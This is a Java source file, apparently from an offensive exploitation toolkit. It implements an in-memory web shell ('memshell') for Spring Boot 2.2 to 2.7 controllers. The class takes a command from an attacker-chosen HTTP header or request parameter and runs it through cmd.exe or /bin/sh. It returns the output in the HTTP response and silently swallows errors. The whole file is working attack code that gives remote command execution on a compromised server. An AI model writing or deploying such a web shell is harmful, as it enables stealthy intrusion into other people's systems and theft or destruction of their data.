package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;

import java.io.InputStream;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-web
 * [2.2.x, 2.7.x]
 */
@MemShell(MemShell.Controller)
@MemShellFunction(MemShellFunction.Exec)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
public class ControllerExec {
    private static String HEADER;
    private static String PARAM;

    public ControllerExec() {
    }

    public static String run() {
        try {
            Object requestAttributes = invokeMethod(Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder"), null, "getRequestAttributes", new Class[]{}, new Object[]{});
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            Object request = invokeMethod(clazz, requestAttributes, "getRequest", new Class[]{}, new Object[]{});
            Object response = invokeMethod(clazz, requestAttributes, "getResponse", new Class[]{}, new Object[]{});
            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            Object parameter = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});


            String str = null;
            if (header != null) {
                str = (String) header;
            } else if (parameter != null) {
                str = (String) parameter;
            }

            String result = exec(str);
            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
            invokeMethod(writer, "flush", new Class[]{}, new Object[]{});
            invokeMethod(writer, "close", new Class[]{}, new Object[]{});
        } catch (Throwable e) {

        }
        return "";
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        }catch (Exception e){
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
